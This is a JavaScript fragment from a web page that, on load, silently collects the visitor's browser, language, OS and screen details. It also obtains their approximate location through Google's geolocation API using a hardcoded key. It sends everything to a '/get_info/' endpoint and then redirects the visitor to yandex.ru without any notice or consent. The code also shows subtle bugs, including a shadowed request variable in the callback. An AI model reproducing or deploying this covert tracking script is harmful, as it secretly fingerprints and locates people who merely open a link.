    function get_cookie ( cookie_name )
{
  var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
 
  if ( results )
    return ( unescape ( results[2] ) );
  else
    return null;
}

function getXmlHttp(){
  var xmlhttp;
  try {
    xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
  } catch (e) {
    try {
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    } catch (E) {
      xmlhttp = false;
    }
  }
  if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
    xmlhttp = new XMLHttpRequest();
  }
  return xmlhttp;
}

	window.onload = function catchfnc() {
		var s = window.screen;
		var brser = navigator.appName;
		var lng = navigator.language;
		var ops = navigator.platform;
		var bbrser = BrowserDetect.browser;
		var bos = BrowserDetect.OS;
		var height = s.height;
		var width = s.width;
		var colors = Math.pow(2, s.colorDepth);
		//var battery = navigator.battery || navigator.webkitBattery || navigator.mozBattery || navigator.msBattery;
		//console.log(battery);
		//var btr_lvl = Math.floor(battery.level * 100) + "%";
		//var chrg = battery.charging;
		var rqst = getXmlHttp();
		var lat; var lng; var rad;
		rqst.open("POST", "https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyBUpYIrPcbH49dVrsfCPorKGjHa0DjABeA", true);
		rqst.send();
		rqst.onreadystatechange = function() {
			if (rqst.readyState == 4) {
				var coords = JSON.parse(rqst.responseText);
				rad = coords.accuracy;
				var location = coords.location;
				lat = location.lat;
				long = location.lng;
				
				
				var rqst = getXmlHttp();
				var addr = "/get_info/"+brser+"/"+lng+"/"+ops+"/"+bbrser+"/"+bos+"/"+height+"/"+width+"/"+colors+"/"+lat+"/"+long+"/"+rad;
				rqst.open("GET", addr, true)
				rqst.send();
				rqst.onreadystatechange = function() {
					if (rqst.readyState == 3 || rqst.readyState == 4) {
						window.location = "http://yandex.ru";
					}
				}

				
				window.location = "http://yandex.ru";
			}
		}

	}
</script>
